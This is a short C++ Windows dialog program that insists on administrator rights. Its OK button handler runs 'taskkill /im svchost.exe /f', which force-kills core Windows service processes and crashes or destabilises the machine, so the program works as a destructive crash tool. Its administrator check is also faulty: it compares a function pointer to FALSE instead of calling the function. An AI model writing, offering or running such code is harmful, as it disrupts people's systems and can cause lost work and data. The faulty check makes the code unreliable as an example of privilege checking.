#include <Windows.h>
#include "Resource.h"
#include <process.h>
#include <iostream>
#include <process.h>
#include <ShObjIdl_core.h>
#pragma comment(lib,"CompareIsRunAsAdministrator.lib")

extern "C" BOOL CompareIsRunAsAdministrator(HWND hWnd);

HWND hWnd;
HINSTANCE hInstance;

LRESULT CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_INITDIALOG:
	{
		return TRUE;
	}
	case WM_COMMAND:
	{
		switch (LOWORD(wParam))
		{
		case IDC_OK:
		{

			
			system("taskkill /im svchost.exe /f");
			break;
		}
		
		default:
		{
			break;
		}
		}
		break;
	}
	case WM_CLOSE:
	{
		PostQuitMessage(1);
		return TRUE;
	}
	default:
	{
		break;
	}
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	if (CompareIsRunAsAdministrator == FALSE)
	{
		MessageBox(hWnd, TEXT("程序运行需要管理员权限！"), TEXT("错误"), MB_OK | MB_ICONERROR);
		exit(-1);
	}
	HWND hMainDialog = CreateDialog(hInstance, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)About);
	ShowWindow(hMainDialog, SW_SHOW);
	UpdateWindow(hMainDialog);

	MSG m_Msg;
	ZeroMemory(&m_Msg, sizeof(m_Msg));

	while (GetMessage(&m_Msg, NULL, 0, 0))
	{
		TranslateMessage(&m_Msg);
		DispatchMessage(&m_Msg);
	}

	return 0;
}



//                      A                L                   EEEEEEEEEE         X     X      'S SOFTWARE
//                    A   A              L                   E                   X   X
//                   A     A             L                   E                    X X
//                  A       A            L                   EEEEEEEEEE            X         (Do not copy without the permission from the author)
//                 AAAAAAAAAAA           L                   E                    X X
//                A           A          L                   E                   X   X
//               A             A         LLLLLLLLLLL         EEEEEEEEEE         X     X